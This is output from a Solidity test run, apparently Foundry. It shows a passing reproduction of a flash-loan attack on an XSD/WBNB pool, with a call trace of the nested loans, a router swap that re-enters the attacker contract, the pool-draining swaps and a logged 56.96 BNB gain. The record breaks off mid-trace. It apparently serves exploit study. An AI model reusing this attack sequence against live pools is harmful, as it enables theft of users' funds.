Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.35s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-09/XSDWETHpool_exp.sol:51:5:
   |
51 |     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (3628): This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.
  --> src/test/2023-09/XSDWETHpool_exp.sol:50:1:
   |
50 | contract ContractTest is Test {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The payable fallback function is defined here.
   --> src/test/2023-09/XSDWETHpool_exp.sol:102:5:
    |
102 |     fallback() external payable {
    |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    тФЬтФА [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 291.76ms (157.36┬╡s CPU time)

Ran 1 test for src/test/2023-09/XSDWETHpool_exp.sol:ContractTest
[PASS] testExploit() (gas: 880304)
Logs:
  Before Start: 0 BNB
  Attack Exploit: 56.964339410199718035 BNB

Traces:
  [959704] ContractTest::testExploit()
    тФЬтФА [2534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФФтФА тЖР [Return] 0
    тФЬтФА [0] console::log("Before Start: %d BNB", 0) [staticcall]
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [938174] DPPOracle::flashLoan(3000000000000000000000 [3e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000a2a15d09519be00000)
    тФВ   тФЬтФА [27962] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3000000000000000000000 [3e21])
    тФВ   тФВ   тФЬтФА emit Transfer(from: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3000000000000000000000 [3e21])
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [886369] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3000000000000000000000 [3e21], 0, 0x0000000000000000000000000000000000000000000000a2a15d09519be00000)
    тФВ   тФВ   тФЬтФА [873934] DPPAdvance::flashLoan(1000000000000000000000 [1e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00000000000000000000000000000000000000000000003635c9adc5dea00000)
    тФВ   тФВ   тФВ   тФЬтФА [871235] 0x7f60701206F85354147806a846CE59Bb7467ac53::flashLoan(1000000000000000000000 [1e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00000000000000000000000000000000000000000000003635c9adc5dea00000) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [8062] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: DPPAdvance: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000 [1e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [836747] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21], 0, 0x00000000000000000000000000000000000000000000003635c9adc5dea00000)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2585] XSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 39566238265722260955438 [3.956e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [795906] Router::swapXSDForETH(9840000000000000000 [9.84e18], 39566238265722260955438 [3.956e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 228330434662557709755649 [2.283e23], 66911215838228063464 [6.691e19], 1695752667 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13200] XSD::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], 39566238265722260955438 [3.956e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], value: 39566238265722260955438 [3.956e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [72018] XSDWETHpool::swap(0, 9840000000000000000 [9.84e18], Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [29962] WBNB::transfer(Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48], 9840000000000000000 [9.84e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], to: Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48], value: 9840000000000000000 [9.84e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [585] XSD::balanceOf(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 267896672928279970711087 [2.678e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] WBNB::balanceOf(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 57071215838228063464 [5.707e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 267896672928279970711087 [2.678e23], reserve1: 57071215838228063464 [5.707e19])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48], amount0In: 39566238265722260955438 [3.956e22], amount1In: 0, amount0Out: 0, amount1Out: 9840000000000000000 [9.84e18], to: Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9365] WBNB::withdraw(9840000000000000000 [9.84e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [225] Router::fallback{value: 9840000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Withdrawal(src: Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48], wad: 9840000000000000000 [9.84e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [636773] ContractTest::fallback{value: 9840000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3262] WBNB::transfer(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], 3800000000000000000000 [3.8e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], value: 3800000000000000000000 [3.8e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [16428] XSDWETHpool::swap(263932735529288914857295 [2.639e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3235] XSD::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 263932735529288914857295 [2.639e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 263932735529288914857295 [2.639e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [585] XSD::balanceOf(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] WBNB::balanceOf(XSDWETHpool: [0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3857071215838228063464 [3.857e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 3963937398991055853792 [3.963e21], reserve1: 3857071215838228063464 [3.857e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 3800000000000000000000 [3.8e21], amount0Out: 263932735529288914857295 [2.639e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [332625] PIDController::systemCalculations()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2606] 0x4d369BD339709021267E92702A9E4cE30be85706::balanceOf(0x224E13D9eAB11eDc09411ef4bF800791a7EF6135) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666623 [1.347e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [37233] XSD::bankx_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [21162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [15643] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2369] 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666623 [1.347e24], 2600870202054432854 [2.6e18], 1695698658 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000198
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2405] XSD::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 20000547033338243084561810 [2e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9181] XSD::xsd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2352] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::collat_XSD()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000015b42616817e3414b
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2407] XSD::global_collateral_ratio() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000000f4240
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [25156] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [21162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [15643] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7181] XSD::xsd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7181] XSD::xsd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
